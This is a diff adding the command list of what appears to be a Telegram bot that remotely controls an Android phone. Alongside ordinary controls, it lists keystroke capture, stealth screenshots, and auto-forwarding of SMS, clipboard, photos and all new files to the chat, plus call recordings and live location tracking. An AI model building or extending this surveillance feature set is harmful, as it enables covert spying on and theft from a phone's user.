@@ -1,0 +1,114 @@
+start - 👋 Welcome & device status
+help - 📖 Help & all commands
+commands - 📝 List all commands with details
+stop - ⛔ Stop the bot
+messages - 💬 SMS conversations — tap one to open
+sms - 📨 Open a thread — /sms <thread_id>
+sendsms - 📤 Send SMS — /sendsms <number> <text>
+schedulesms - ⏰ Schedule an SMS — /schedulesms <number> <delay_sec> <text>
+forwardsms - 📩 Toggle auto-forwarding of incoming SMS to this chat
+mms - 💬 Browse MMS multimedia messages — /mms [n]
+calls - 📞 Recent call log
+recordings - 🎙️ Call recordings — tap to download
+livecall - 📞 Live call hub — accept / mute / end ongoing calls
+callnow - 📞 Initiate outgoing call — /callnow <number>
+blocknumber - 🚫 Block/unblock incoming calls — /blocknumber [number]
+contacts - 👥 Browse contacts — tap to call, SMS, or share
+find - 🔍 Reverse-lookup a phone number — /find <number>
+addcontact - ➕ Add a new contact — interactive
+deletecontact - 🗑 Delete a contact by name or number
+contactgroups - 👥 Contact groups — list and view members
+notifications - 🔔 Recent notifications
+mutenotifs - 🔕 Mute / unmute auto-forwarded notifications — /mutenotifs [on|off]
+logs - 📋 Notification log history
+screenshot - 📸 Take a screenshot
+photo - 📷 Camera photo — /photo [front|back]
+audio - 🎙 Record audio — interactive duration picker
+video - 🎬 Record video — pick camera, then duration
+shots - 🖼 Recent stealth screenshots — /shots [n]
+forwardphotos - 📷 Auto-forward new camera photos — /forwardphotos [on|off]
+forwardshots - 📸 Auto-forward stealth screenshots to chat — /forwardshots [on|off]
+files - 📁 Browse storage — tap folders to open, files to download
+storage - 💾 Storage usage — internal, SD card, USB
+docs - 📄 Document library (PDF, DOCX, etc.) — /docs [search]
+filehash - #️⃣ File hash (SHA-256 + MD5) — /filehash <path>
+deletefile - 🗑 Delete a file from device — /deletefile <path>
+forwardfiles - 📁 Auto-forward ALL new files & media from storage — /forwardfiles [on|off]
+fwdfiles - 📂 Recently auto-forwarded files — /fwdfiles [n]
+filestats - 📊 File auto-forward queue stats (pending / done / failed)
+retryfailed - 🔄 Retry all permanently-failed file uploads
+location - 📍 Current GPS location
+livelocation - 🗺 Live location stream — /livelocation [n]
+tracklocation - 🧭 Recent location points — /tracklocation [n]
+track - 🛰 Tracking hub overview
+geofence - 🗺 Geofence zones — list, add, delete, view events
+forwardgeofence - 🗺 Auto-forward geofence enter/exit alerts — /forwardgeofence [on|off]
+apps - 📱 List installed apps
+launch - 🚀 Launch any app — /launch <pkg|name>
+launches - 🚀 Recent app launches — /launches [n]
+blockapp - 🚫 Block an app — interactive picker
+unblockapp - ✅ Unblock an app — interactive picker
+blockedapps - 📵 Show all blocked & limited apps
+screentime - ⏱ App screen time — /screentime [days]
+clearcache - 🗑 Clear an app's cache — interactive picker
+device - 📲 Device information
+battery - 🔋 Battery status
+batteryhistory - 🔋 Battery drain chart — /batteryhistory [hours]
+batteryalert - 🔋 Low-battery auto-alert — /batteryalert [on|off] [threshold%]
+lockscreen - 🔒 Lock the device screen instantly
+wake - 📺 Wake screen — /wake [seconds]
+brightness - 🔆 Screen brightness — /brightness [0-100]
+volume - 🔊 Volume — /volume [stream] [0-100]
+reboot - 🔄 Reboot device (requires root or Device Admin)
+setalarm - ⏰ Set a system alarm — /setalarm HH:MM [label]
+bedtime - 🌙 View / set the parental bedtime window
+wifi - 📶 Wi-Fi state / toggle — /wifi [on|off]
+wifiscan - 📡 Scan nearby Wi-Fi networks
+mobiledata - 📡 Mobile data — show status and toggle on/off
+bluetooth - 🔵 Bluetooth devices & control — /bluetooth [on|off]
+hotspot - 📶 Mobile hotspot status / toggle — /hotspot [on|off]
+airplane - ✈️ Airplane mode toggle — /airplane [on|off]
+dnd - 🔇 Do Not Disturb — /dnd [on|off|toggle]
+vpn - 🔐 VPN connection status
+networkinfo - 🌐 Extended network & Wi-Fi details
+netusage - 📊 Network usage — /netusage [days]
+sim - 📡 SIM card & carrier info
+datasettings - 📡 Open mobile-data settings page on device
+keystrokes - ⌨️ Captured keystrokes — /keystrokes [n]
+keytop - 📊 Top apps by keystroke count
+timeline - 📋 Device activity timeline — /timeline [n]
+permissions - 🛡 Status of every app permission
+soundmeter - 🎙 Ambient sound level — /soundmeter [seconds]
+gyroscope - 🌀 Live gyroscope rotation rate (rad/s)
+compass - 🧭 Magnetic compass heading & cardinal direction
+barometer - 🌡 Atmospheric pressure (hPa) and altitude (m)
+steps - 👟 Step count since last reboot + today estimate
+proximity - 📡 Proximity sensor — near or far
+speak - 🗣 Text-to-speech — /speak <text>
+stopspeak - 🤫 Stop the device speaking right now
+vibrate - 📳 Vibrate device — /vibrate [seconds]
+toast - 💬 Quick toast pop-up on device — /toast <text>
+show - 💡 Show banner on device — /show <text>
+findphone - 🚨 Locate phone with alarm — /findphone [on|off]
+torch - 🔦 Flashlight — /torch [on|off]
+clipboard - 📋 Read or set device clipboard — /clipboard [text to set]
+forwardclipboard - 📋 Auto-forward clipboard changes to chat — /forwardclipboard [on|off]
+notes - 📝 Browse notes — /notes [search]
+addnote - ➕ Create a new note (interactive)
+editnote - ✏️ Edit an existing note — interactive
+bookmarks - 🔖 Browse bookmarks — /bookmarks [search]
+addbookmark - 🔗 Add a bookmark — /addbookmark <url>
+feeds - 📡 RSS feeds — tap to view recent entries
+feedentries - 📰 Recent feed entries — /feedentries [search]
+music - 🎵 Music library — tap to download
+videos - 🎞 Video library — tap to download
+images - 🖼 Image gallery — tap to send
+nowplaying - 🎵 Now-playing status + playback controls
+automations - ⚙️ List automation rules
+newrule - ➕ Create a manual rule — /newrule <name> <action> <args>
+newschedule - 📅 Create a daily schedule — /newschedule HH:MM <name> <action> <args>
+delrule - 🗑 Delete a rule — /delrule <id>
+runrule - ▶️ Run an automation — /runrule <id>
+togglerule - 🔁 Enable/disable a rule — /togglerule <id>
+pomodoro - 🍅 Pomodoro — start/pause/stop/status
+qrcode - 📷 Generate QR code image — /qrcode <text or URL>
